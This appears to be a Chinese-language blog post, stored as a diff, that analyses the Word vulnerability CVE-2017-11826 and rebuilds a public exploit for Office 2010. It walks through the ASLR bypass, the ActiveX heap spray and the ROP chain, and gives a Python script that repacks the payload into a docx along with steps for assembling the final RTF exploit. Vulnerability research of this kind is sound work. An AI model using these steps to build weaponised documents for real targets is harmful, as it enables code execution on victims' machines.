@@ -1,0 +1,440 @@
+I"�{<h1 id="前言">前言</h1>
+
+<p>最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。</p>
+
+<h1 id="漏洞分析">漏洞分析</h1>
+
+<h2 id="分析环境">分析环境</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS:			Win7 x64 SP1
+Office:		    	Ofiice 2010 x86
+Image name: 		wwlib.dll
+Timestamp:      	Sat Mar 27 23:37:07 2010 (4BAE2623)
+CheckSum:       	0127F568
+ImageSize:      	0127A000
+File version:   	14.0.4762.1000
+Product version:	14.0.4762.0
+</code></pre></div></div>
+
+<h2 id="静态分析">静态分析</h2>
+
+<p>在rtf文档中搜索object，发现嵌入了3个ole对象：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727171412503.png" alt="image-20210727171412503" /></p>
+
+<p>第一个对象的CLSID为<code class="language-plaintext highlighter-rouge">D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731</code>，在注册表搜索后发现该对象位于<code class="language-plaintext highlighter-rouge">C:\Windows\SysWOW64\msvbvm60.dll</code>，而该dll是没有ASLR的。</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727175112215.png" alt="image-20210727175112215" /></p>
+
+<p>通过ProcessExplorer发现word打开rtf文档后确实加载了msvbvm60.dll，且该dll无ASLR，说明该ole对象的作用是绕过ASLR。</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727180558328.png" alt="image-20210727180558328" /></p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">rtfobj.py -s all</code>提取ole对象：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727165632756.png" alt="image-20210727165632756" /></p>
+
+<p>第一个对象经过上面的分析是用于绕过ASLR的，第二和第三个都是.doc文档，使用压缩软件直接打开第二个文档，文档结构如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│  [Content_Types].xml
+│  
+├─docProps
+│      app.xml
+│      core.xml
+│      
+├─word
+│  │  document.xml
+│  │  fontTable.xml
+│  │  settings.xml
+│  │  styles.xml
+│  │  webSettings.xml
+│  │  
+│  ├─activeX
+│  │  │  activeX1.bin
+│  │  │  activeX1.xml
+│  │  │  activeX2.xml
+│  │  │  	······
+│  │  │  activeX40.xml
+│  │  │  
+│  │  └─_rels
+│  │          activeX1.xml.rels
+│  │          activeX2.xml.rels
+│  │          		······
+│  │          activeX40.xml.rels
+│  │          
+│  ├─media
+│  │      image1.wmf
+│  │      
+│  ├─theme
+│  │      theme1.xml
+│  │      
+│  └─_rels
+│          document.xml.rels
+│          
+└─_rels
+        .rels
+</code></pre></div></div>
+
+<p>可以看出使用了40个activeX.xml文件，文件内容如下：</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span>
+<span class="nt">&lt;ax:ocx</span> <span class="na">ax:classid=</span><span class="s">"{00000000-0000-0000-0000-000000000001}"</span> <span class="na">ax:persistence=</span><span class="s">"persistStorage"</span> <span class="na">r:id=</span><span class="s">"rId1"</span> <span class="na">xmlns:ax=</span><span class="s">"http://schemas.microsoft.com/office/2006/activeX"</span> <span class="na">xmlns:r=</span><span class="s">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span><span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>40个xml文件内容一致，加载了CLSID为{00000000-0000-0000-0000-000000000001}的对象，然而系统中并没有这个对象，所以并不会加载任何对象，这么做是为了提高堆喷的效率，具体原理可查看<a href="https://www.greyhathacker.net/?p=911">SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE</a>一文。</p>
+
+<p>而40个activeX.xml.rels的内容也完全一致：</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
+<span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">"http://schemas.openxmlformats.org/package/2006/relationships"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;Relationship</span> <span class="na">Id=</span><span class="s">"rId1"</span> <span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary"</span> <span class="na">Target=</span><span class="s">"activeX1.bin"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/Relationships&gt;</span>
+</code></pre></div></div>
+
+<p>都指向了activeX1.bin文件，因此会将activeX1.bin在内存中加载40次，以此达到堆喷的目的。</p>
+
+<p>activeX1.bin文件结构如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activeX1.bin
+│ -文件头 
+│ -数据
+│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
+│    │						······
+│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
+│    │---shellcode ······
+│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
+│    │						······
+│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
+│    │						······
+│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
+│    │						······
+
+</code></pre></div></div>
+
+<p>看结构似乎是滑板指令加shellcode，待调试验证。</p>
+
+<p>第三个文档结构如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│  [Content_Types].xml
+│  
+├─docProps
+│      app.xml
+│      core.xml
+│      
+├─word
+│  │  document.xml
+│  │  endnotes.xml
+│  │  fontTable.xml
+│  │  footnotes.xml
+│  │  settings.xml
+│  │  styles.xml
+│  │  webSettings.xml
+│  │  
+│  ├─theme
+│  │      theme1.xml
+│  │      
+│  └─_rels
+│          document.xml.rels
+│          
+└─_rels
+        .rels
+</code></pre></div></div>
+
+<p>document.xml的内容如下：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804144955166.png" alt="image-20210804144955166" /></p>
+
+<p>观测到&lt;w:font 标签内有异常字符，且标签未正常闭合，预测漏洞触发于该处。</p>
+
+<p>通过静态分析了解到RTF文档通过内嵌3个ole对象来实现ASLR绕过、堆喷射和漏洞触发，ASLR绕过是通过加载CLSID为<code class="language-plaintext highlighter-rouge">D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731</code>的COM对象，将<code class="language-plaintext highlighter-rouge">msvbvm60.dll</code>加载到内存中。堆喷射利用40个activeX.xml.rels指向唯一的activeX1.bin文件，将activeX1.bin文件中的数据部分，即偏移为0x800后的内容加载到内存中实现堆喷射。而漏洞触发部分则利用document.xml中的异常字符和标签触发漏洞。</p>
+
+<h3 id="动态调试">动态调试</h3>
+
+<p>使用windbg附加word，打开漏洞文件：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727162527153.png" alt="image-20210727162527153" /></p>
+
+<p>可以看到异常因为ecx+4指向的内存无法访问导致错误。查看反汇编得知ecx的值来源于eax，此时eax的值为<code class="language-plaintext highlighter-rouge">088888ec</code>。再次打开漏洞文件发现ecx的值改变，但是eax的值仍为<code class="language-plaintext highlighter-rouge">088888ec</code>，说明eax的值为故意构造。</p>
+
+<p>于是打算下断在函数<code class="language-plaintext highlighter-rouge">wwlib!DllGetClassObject+0x42d4 (71ed98b0)</code>查看eax是如何生成的。查看wwlib的基地址，算出函数的偏移为<code class="language-plaintext highlighter-rouge">wwlib+004da16b</code>。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; lm m wwlib
+start    end        module name
+71ed0000 7314a000   wwlib      (export symbols)       C:\PROGRA~2\MICROS~1\Office14\wwlib.dll
+0:000&gt; ? 723aa16b-71ed0000
+Evaluate expression: 5087595 = 004da16b
+</code></pre></div></div>
+
+<p>重新打开漏洞文档，<code class="language-plaintext highlighter-rouge">bp wwlib+004da16b</code>下断：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112402518.png" alt="image-20210802112402518" /></p>
+
+<p>步过两次后执行到如图所示位置时，查看eax所在的内存：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112612050.png" alt="image-20210802112612050" /></p>
+
+<p>发现和在文档3中的字符串一致，接着查看eax+44，对应的正是异常触发时eax的值<code class="language-plaintext highlighter-rouge">088888ec</code>。</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112936829.png" alt="image-20210802112936829" /></p>
+
+<p>但在xml文件中，字符串中的异常字符的十六进制为<code class="language-plaintext highlighter-rouge">e8a3ace0a288</code>：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802140720647.png" alt="image-20210802140720647" /></p>
+
+<p>在文件中显示的格式是Ascii，然而在内存中显示的是Unicode，于是将文件中的字符以utf-8格式转换为十六进制正是eax的值<code class="language-plaintext highlighter-rouge">088888ec</code>：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802142105409.png" alt="image-20210802142105409" /></p>
+
+<p>说明通过修改该字符串可以控制eax的值，进而控制eip。</p>
+
+<p>在ida中找到奔溃函数为sub_31A55CE6，发现变量v3是宽字节字符串，位于arg2+0x18，变量v4是一个长度，位于arg2+0x1c</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802153650508.png" alt="image-20210802153650508" /></p>
+
+<p>在windbg设置崩溃函数起始点打印v3为字符串，长度为v4：<code class="language-plaintext highlighter-rouge">bp wwlib+385ce6 "du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"</code></p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802161250939.png" alt="image-20210802161250939" /></p>
+
+<p>可以看到v3就是xml文件中的标签，在解析到idmp标签后程序崩溃，然而并没有看到font标签，于是寻找到崩溃函数的父函数sub_3170FA5A</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802163044663.png" alt="image-20210802163044663" /></p>
+
+<p>崩溃函数arg2的值为edi，而edi的值为父函数的arg2：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802165001758.png" alt="image-20210802165001758" /></p>
+
+<p>于是在父函数和崩溃函数同时下断，查看标签解析情况：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bp wwlib+3fa5a ".printf \"Parent_Func:	\"; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"
+bp wwlib+385ce6 ".printf \"Crash_Func:	\"; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802170632918.png" alt="image-20210802170632918" /></p>
+
+<p>在父函数成功解析到font标签，猜测因为font标签未闭合而导致崩溃函数解析标签出错产生漏洞，修改了xml文件闭合了font标签：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804145041151.png" alt="image-20210804145041151" /></p>
+
+<p>将修改后的docx文件嵌入到新建的rtf文件中，在windbg中调试后发现eax的值改变了，并且没有异常，证实因为font标签未闭合导致的漏洞。</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802180616278.png" alt="image-20210802180616278" /></p>
+
+<p>继续调试发现异常触发点的eax和ecx都是来自于esi，而esi为漏洞函数的arg1：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803145832128.png" alt="image-20210803145832128" /></p>
+
+<p>因此在漏洞函数打印标签以及[[esi+17f0]]、[[esi+17f0]+8]、[[esi+17f0]+c]和[esi+17f0]的值：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bp wwlib+385ce6 "du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); r $t0=poi(poi(esp+4)+17f0); dd poi($t0) L1; dd poi($t0)+8 L1; dd poi($t0)+c L1; dd $t0 L1; .printf\"\\n\"; g;"
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803162436403.png" alt="image-20210803162436403" /></p>
+
+<p>打印出的结构就是Taglist结构体，具体结构参考goabout2的<a href="https://www.cnblogs.com/goabout2/p/8186018.html">office CVE-2017-11826杂谈</a>一文。</p>
+
+<p>接着调试异常触发点上的函数，发现函数功能为通过层级标签获取TagObject Array[Index-2]：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803192637477.png" alt="image-20210803192637477" /></p>
+
+<p>继续向上追溯，发现函数GetTagObject也调用了GetTagObjectByIndex，通过分析发现该函数获取的是TagObject Array[Index-1]的地址：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803193709068.png" alt="image-20210803193709068" /></p>
+
+<p>分析到这里，漏洞产生的原因也就出来了，由于word每解析一个标签，Current_Index的值就加一，当解析到闭合标签，Current_Index值会减1。由于构造了没有闭合的font标签，因此导致在解析idmap标签时比正常文件的Current_Index多一，导致原本应该获取OLEObject标签的TagObject变成获取了font的TagObject，因此造成了标签类型混淆导致漏洞的发生。</p>
+
+<p>将标签层级和xml文件标签对应：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803164645125.png" alt="image-20210803164645125" /></p>
+
+<p>可以证实确实因为Current_Index值比正常文件的多一导致的类型混淆。</p>
+
+<p>在内存中查看当解析idmap层级为6时Taglist的内存结构：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; bp wwlib+4da16b
+&gt; g
+Breakpoint 1 hit
+eax=070f1800 ebx=00000000 ecx=0225466c edx=00000004 esi=0225466c edi=070f19dc
+eip=6f95a16b esp=002cf428 ebp=002cf490 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+wwlib!DllGetLCID+0x2cc775:
+6f95a16b e840f7b2ff      call    wwlib!DllGetClassObject+0x42d4 (6f4898b0)
+&gt; ub $ip L8
+wwlib!DllGetLCID+0x2cc75d:
+6f95a153 83780401        cmp     dword ptr [eax+4],1
+6f95a157 0f85f5bdeaff    jne     wwlib!DllGetLCID+0x17855c (6f805f52)
+6f95a15d 8bb6f0170000    mov     esi,dword ptr [esi+17F0h]
+6f95a163 8b06            mov     eax,dword ptr [esi]
+6f95a165 8b10            mov     edx,dword ptr [eax]
+6f95a167 4a              dec     edx
+6f95a168 4a              dec     edx
+6f95a169 8bce            mov     ecx,esi
+</code></pre></div></div>
+
+<p>此时eax的值即为Taglist，因此查看eax指向的Taglist结构：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803215207578.png" alt="image-20210803215207578" /></p>
+
+<p>此时TagObject[4]+0x44的值为<code class="language-plaintext highlighter-rouge">0x090b4000</code>，查看该值在内存中存储的数据：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803213913808.png" alt="image-20210803213913808" /></p>
+
+<p>发现[[TagObject[4]+0x44]+0x44]的值正是xml文件中font标签构造的固定地址，自此漏洞部分分析完毕。</p>
+
+<h2 id="漏洞利用">漏洞利用</h2>
+
+<p>先启动word然后使用windbg附加会导致堆喷无法成功，继而无法分析漏洞利用部分。因此使用gflags.exe让调试器直接加载winword.exe：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803220115994.png" alt="image-20210803220115994" /></p>
+
+<p>设置断点在异常触发点：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; bp wwlib+4da184
+&gt; g
+Breakpoint 0 hit
+eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004b44b4 edi=0340cddc
+eip=6e2da184 esp=002f5f14 ebp=002f5f7c iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+wwlib!DllGetLCID+0x2cc78e:
+6e2da184 50              push    eax
+0:000&gt; u $ip
+wwlib!DllGetLCID+0x2cc78e:
+6e2da184 50              push    eax
+6e2da185 ff5104          call    dword ptr [ecx+4]
+6e2da188 e9fabdeaff      jmp     wwlib!DllGetLCID+0x178591 (6e185f87)
+6e2da18d 83f802          cmp     eax,2
+6e2da190 750f            jne     wwlib!DllGetLCID+0x2cc7ab (6e2da1a1)
+6e2da192 83c624          add     esi,24h
+6e2da195 56              push    esi
+6e2da196 52              push    edx
+&gt; dd ecx+4
+088883f0  72980e2b 72980e2b 72980e2b 72980e2b
+08888400  72980e2b 72980e2b 72980e2b 72980e2b
+08888410  72980e2b 72980e2b 72980e2b 72980e2b
+08888420  72980e2b 72980e2b 72980e2b 72980e2b
+08888430  72980e2b 72980e2b 72980e2b 72980e2b
+08888440  72980e2b 72980e2b 72980e2b 72980e2b
+08888450  72980e2b 72980e2b 72980e2b 72980e2b
+08888460  72980e2b 72980e2b 72980e2b 72980e2b
+</code></pre></div></div>
+
+<p>发现exc+4的值为activeX1.bin中shellcode下方的填充，说明已经成功堆喷。</p>
+
+<p>步入[exc+4]后发现来到了msvbvm60.dll，已经进入了ROP链：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; t
+eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004c44b4 edi=0043cddc
+eip=72980e2b esp=00385a18 ebp=00385a88 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+msvbvm60!IID_IVbaHost+0x127eb:
+72980e2b 94              xchg    eax,esp
+</code></pre></div></div>
+
+<p>而第一条指令则是用来栈迁移，在之前已经将eax入栈，而eax的值正是构造好的<code class="language-plaintext highlighter-rouge">0x088888ec</code>，执行指令后，esp的值已经变成了<code class="language-plaintext highlighter-rouge">0x088888ec</code>：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803223544350.png" alt="image-20210803223544350" /></p>
+
+<p>而eax中的内容刚好位于shellcode的上方，此时ROP链为滑板指令，循环执行<code class="language-plaintext highlighter-rouge">pop eax</code>和<code class="language-plaintext highlighter-rouge">ret</code>，此时可以下断<code class="language-plaintext highlighter-rouge">bp 729440cc ".if(esp=08888f48){}.else{gc}"</code>停在了滑板指令结束的位置：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804102057063.png" alt="image-20210804102057063" /></p>
+
+<p>当执行到最后一次滑板指令时，会将<code class="language-plaintext highlighter-rouge">0x729410d0</code>放入eax中，而该值是msvbvm60.dll的IAT表中的数据，查看后存储的是VirtualProtect的地址：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804103009190.png" alt="image-20210804103009190" /></p>
+
+<p>紧接着通过ret跳转到ROP指令<code class="language-plaintext highlighter-rouge">jmp [eax]</code>执行VirtualProtect，而此时栈中为构造好的VirtualProtect的参数：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104003516.png" alt="image-20210804104003516" /></p>
+
+<p>再次跳转后进入到kernelbase.dll的VirtualProtect：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104216392.png" alt="image-20210804104216392" /></p>
+
+<p>执行后会跳转到<code class="language-plaintext highlighter-rouge">0x08888f70</code>执行shellcode：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104652987.png" alt="image-20210804104652987" /></p>
+
+<p>然而VirtualProtect的修改的内存范围只有<code class="language-plaintext highlighter-rouge">0x08888c90 - 0x08888e91</code>，而shellcode却位于<code class="language-plaintext highlighter-rouge">0x08888f70</code>，因此会触发c0000005访问异常，shellcode执行失败：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804105857160.png" alt="image-20210804105857160" /></p>
+
+<h2 id="利用改造">利用改造</h2>
+
+<p>activeX1.bin文件中布局如下：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804115244951.png" alt="image-20210804115244951" /></p>
+
+<p>由于原本VirtualProtect修改的范围为0x201不够，因此修改为0x1000确保能够覆盖shellcode，随后将shellcode替换为自己的shellcode即可。</p>
+
+<p>将修改好的activeX1.bin文件替换到rtfobj.py提取出来进行堆喷的文档中，并修改为.docx，脚本参考<a href="https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/">Exploiting Word: CVE-2017-11826</a>一文，替换脚本如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+
+<span class="n">template_path</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">final_docx_name</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">activeX_bin_path</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">def</span> <span class="nf">pack_file_to_open_xml_docx</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">,</span> <span class="n">activeX_bin_path</span><span class="p">):</span> 
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">template_path</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">activeX_bin_path</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Template docx file or activeX.bin file not exist."</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">activeX_bin_path</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_</span><span class="p">:</span> 
+        <span class="n">object_bin_data</span> <span class="o">=</span> <span class="n">f_</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="n">zip_docx</span> <span class="o">=</span> <span class="n">template_path</span> <span class="o">+</span> <span class="s">".zip"</span>
+    <span class="n">current_dir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
+    <span class="n">new_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">current_dir</span><span class="p">,</span> <span class="s">"exp"</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">basename</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">))</span> 
+    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">new_path</span><span class="p">):</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">new_path</span><span class="p">)</span>
+
+    <span class="n">shutil</span><span class="p">.</span><span class="n">copy</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">new_path</span><span class="p">)</span> 
+    <span class="n">zip_docx</span> <span class="o">=</span> <span class="n">new_path</span>
+    <span class="c1"># open temp docx and a copy for modification 
+</span>    <span class="n">zin</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> 
+    <span class="n">zip_docx_copy</span> <span class="o">=</span> <span class="n">zip_docx</span> <span class="o">+</span> <span class="s">"_copy_"</span> 
+    <span class="n">zout</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_docx_copy</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
+    <span class="c1"># modify the docx template with exploit 
+</span>    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">zin</span><span class="p">.</span><span class="n">infolist</span> <span class="p">():</span>
+        <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"activeX1"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">".bin"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span> 
+            <span class="k">pass</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">buffer</span> <span class="o">=</span> <span class="n">zin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
+            <span class="n">zout</span><span class="p">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">)</span> <span class="c1"># use existing file
+</span>            
+    <span class="n">zout</span><span class="p">.</span><span class="n">writestr</span><span class="p">(</span><span class="s">"word/activeX/"</span> <span class="o">+</span> <span class="s">"activeX1.bin"</span><span class="p">,</span> <span class="n">object_bin_data</span><span class="p">)</span> 
+    <span class="n">zout</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span> 
+    <span class="n">zin</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
+    <span class="c1"># convert to docx
+</span>    <span class="n">os</span><span class="p">.</span><span class="n">rename</span> <span class="p">(</span><span class="n">zip_docx_copy</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">)</span> 
+    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">)</span>
+
+<span class="n">pack_file_to_open_xml_docx</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">,</span> <span class="n">activeX_bin_path</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>新建一个rtf文件，将替换好的docx文件添加到rtf文件中，保存后使用010Editor打开，搜索object，将{\object和{*\objdata的全部内容复制:</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804120429898.png" alt="image-20210804120429898" /></p>
+
+<p>再新建一个rtf文件，按照堆喷射、Bypass ASLR和漏洞触发的顺序添加三个对象。堆喷射的内容就是上方复制好的内容，其他两个可以直接在原EXP中复制过来即可，最终EXP的结构如下所示：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141320122.png" alt="image-20210804141320122" /></p>
+
+<p>最终成功执行了shellcode：</p>
+
+<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141657444.png" alt="image-20210804141657444" /></p>
+
+<h1 id="参考链接">参考链接</h1>
+
+<p>[1] <a href="https://www.anquanke.com/post/id/87122">CVE-2017-11826漏洞分析、利用及动态检测</a></p>
+
+<p>[2] <a href="https://www.cnblogs.com/goabout2/p/8186018.html">office CVE-2017-11826杂谈</a></p>
+
+<p>[3] <a href="https://www.greyhathacker.net/?p=911">SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE</a></p>
+
+<p>[4] <a href="https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/">Exploiting Word: CVE-2017-11826</a></p>
+
+<p>[5] <a href="https://www.anquanke.com/post/id/103080">Open XML标签解析类漏洞分析思路</a></p>
+
+:ET
